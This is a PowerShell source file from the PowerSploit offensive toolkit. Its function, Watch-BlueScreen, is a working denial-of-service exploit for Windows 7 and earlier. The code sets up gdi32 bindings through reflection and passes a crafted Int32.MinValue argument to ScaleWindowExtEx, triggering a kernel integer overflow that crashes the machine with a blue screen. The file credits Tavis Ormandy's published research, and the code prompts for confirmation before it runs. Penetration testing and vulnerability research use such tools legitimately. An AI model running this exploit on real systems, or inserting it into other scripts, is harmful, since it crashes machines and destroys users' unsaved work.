function Watch-BlueScreen
{
<#
.SYNOPSIS

    Cause a blue screen to occur (Windows 7 and below).

    PowerSploit Function: Watch-BlueScreen
    Author: Matthew Graeber (@mattifestation)
    Original Research: Tavis Ormandy and Nikita Tarakanov
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.NOTES

    Tavis Ormandy documented this technique on 2/3/2013 and Nikita Tarakanov
    ‏tweeted this technique on 5/13/2013.

.LINK

    https://gist.github.com/taviso/4658638
    http://blog.cmpxchg8b.com/2013/02/the-other-integer-overflow.html
    https://twitter.com/NTarakanov/status/334031968465453057
#>
    [CmdletBinding( ConfirmImpact = 'High')] Param ()

    try { $Gdi32 = [Gdi32] } catch [Management.Automation.RuntimeException]
    {
        $DynAssembly = New-Object System.Reflection.AssemblyName('BSOD')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BSOD', $False)
        $TypeBuilder = $ModuleBuilder.DefineType('Gdi32', 'Public, Class')

        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder( $DllImportConstructor, @('ntdll.dll'),
                                                                                          [Reflection.FieldInfo[]]@($SetLastError), @($true))

        $TypeBuilder.DefinePInvokeMethod( 'CreateCompatibleDC',
                                          'Gdi32.dll',
                                          'Public, Static',
                                          'Standard',
                                          [IntPtr],
                                          @([IntPtr]),
                                          'Winapi',
                                          'Auto' ).SetCustomAttribute($SetLastErrorCustomAttribute)

        $TypeBuilder.DefinePInvokeMethod( 'SetLayout',
                                          'Gdi32.dll',
                                          'Public, Static',
                                          'Standard',
                                          [UInt32],
                                          @([IntPtr], [UInt32]),
                                          'Winapi',
                                          'Auto' ) | Out-Null

        $TypeBuilder.DefinePInvokeMethod( 'ScaleWindowExtEx',
                                          'Gdi32.dll',
                                          'Public, Static',
                                          'Standard',
                                          [Bool],
                                          @([IntPtr], [Int32], [Int32], [Int32], [Int32], [IntPtr]),
                                          'Winapi',
                                          'Auto' ) | Out-Null

        $Gdi32 = $TypeBuilder.CreateType()
    }

    $LAYOUT_RTL = 1

    if ($psCmdlet.ShouldContinue( 'Do you want to continue?', 'You may want to save your work before continuing.' ))
    {
        $DC = $Gdi32::CreateCompatibleDC([IntPtr]::Zero)
        $Gdi32::SetLayout($DC, $LAYOUT_RTL) | Out-Null
        $Gdi32::ScaleWindowExtEx($DC, [Int32]::MinValue, -1, 1, 1, [IntPtr]::Zero) | Out-Null
    }
}